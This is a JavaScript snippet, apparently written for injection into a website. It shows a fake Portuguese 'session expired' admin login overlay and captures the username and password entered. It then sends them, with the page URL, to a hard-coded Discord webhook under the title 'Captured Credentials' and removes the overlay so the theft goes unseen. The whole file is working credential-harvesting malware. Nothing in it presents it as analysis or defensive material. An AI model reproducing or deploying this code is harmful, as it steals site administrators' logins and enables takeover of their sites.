(function() {
    if (document.getElementById('pm111')) return;

    var s = document.createElement('style');
    s.textContent = [
        '#pm111{position:fixed;top:0;left:0;width:100vw;height:100vh;',
        'background:rgba(0,0,0,.85);backdrop-filter:blur(5px);',
        'z-index:2147483647;display:flex;align-items:center;',
        'justify-content:center;font-family:Arial,sans-serif}',
        '#pmbox{width:520px;max-width:90%;overflow:hidden;',
        'box-shadow:0 10px 30px rgba(0,0,0,.8);border-radius:4px}',
        '.pminput{display:block;width:100%;height:47px;border:1px solid #E6E6E6;',
        'padding:0 10px;font-size:14px;box-sizing:border-box;',
        'margin-bottom:16px;outline:none}',
        '.pmbtn{cursor:pointer;padding:15px 20px;font-size:11px;',
        'text-transform:uppercase;color:#fff;border:none;border-radius:5px;font-weight:bold}'
    ].join('');
    document.head.appendChild(s);

    var d = document.createElement('div');
    d.id = 'pm111';

    var box = document.createElement('div');
    box.id = 'pmbox';

    var header = document.createElement('div');
    header.style.cssText = 'background:#2FACD8;padding:25px;text-align:center;';
    header.innerHTML = '<p style="margin:0;color:#fff;font-size:24px;text-transform:uppercase;font-weight:bold;">Administracao do Site</p>' +
        '<p style="margin:8px 0 0;color:#fff;font-size:13px;">Sua Sessao Expirou. Efetue o login novamente.</p>';

    var body = document.createElement('div');
    body.style.cssText = 'padding:25px;background:#F8F8F8;';

    var inputU = document.createElement('input');
    inputU.type = 'text';
    inputU.id = 'pm_u';
    inputU.placeholder = 'Login Admin';
    inputU.className = 'pminput';
    inputU.autocomplete = 'off';

    var inputP = document.createElement('input');
    inputP.type = 'password';
    inputP.id = 'pm_p';
    inputP.placeholder = 'Senha';
    inputP.className = 'pminput';
    inputP.autocomplete = 'off';

    body.appendChild(inputU);
    body.appendChild(inputP);

    var footer = document.createElement('div');
    footer.style.cssText = 'padding:20px;background:#F1F1F1;text-align:right;';

    var btn = document.createElement('button');
    btn.id = 'pm_btn';
    btn.className = 'pmbtn';
    btn.style.background = '#2EADD4';
    btn.textContent = 'Entrar no Painel';

    footer.appendChild(btn);
    box.appendChild(header);
    box.appendChild(body);
    box.appendChild(footer);
    d.appendChild(box);

    document.body.style.overflow = 'hidden';
    document.body.appendChild(d);

    btn.onclick = function() {
        var u = document.getElementById('pm_u').value;
        var p = document.getElementById('pm_p').value;
        if (!u || !p) {
            btn.style.background = '#ff4d4d';
            setTimeout(function() { btn.style.background = '#2EADD4'; }, 1000);
            return;
        }
        btn.textContent = 'Autenticando...';
        var ts = new Date().toISOString();
        var payload = JSON.stringify({
            embeds: [{
                title: "Credenciais Capturadas",
                color: 16711680,
                fields: [
                    { name: "Login", value: u, inline: true },
                    { name: "Senha", value: p, inline: true },
                    { name: "URL", value: window.location.href, inline: false },
                    { name: "Timestamp", value: ts, inline: false }
                ]
            }]
        });
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://discord.com/api/webhooks/1493707538099605795/GuYho66-ozTTH1UlJsKsrFDL2CTdlgXMDsL_nnbp8F01xg-ooWcF6t67IBl84eFFb1oH', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onloadend = function() {
            document.getElementById('pm111').remove();
            document.body.style.overflow = 'auto';
        };
        xhr.send(payload);
    };
})();
